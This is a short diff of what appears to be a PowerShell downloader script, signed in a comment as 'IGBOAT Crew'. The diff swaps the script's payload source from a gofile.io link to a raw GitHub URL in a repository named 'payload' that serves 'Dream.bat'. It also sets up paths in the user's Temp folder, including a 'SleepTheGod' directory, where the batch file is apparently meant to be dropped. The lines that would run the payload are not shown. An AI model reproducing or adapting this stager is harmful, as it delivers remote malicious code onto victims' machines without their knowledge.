@@ -1,4 +1,4 @@
-$a = "<https://store8.gofile.io/download/web/082133f4-818e-4d62-a029-6eada90e3560/Dream.bat>"
+$a = "<https://raw.githubusercontent.com/baledreamer/payload/refs/heads/main/Dream.bat>"
 # IGBOAT Crew
 $y = "$env:temp\\xxxxx.bat"
 $sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp\\SleepTheGod"
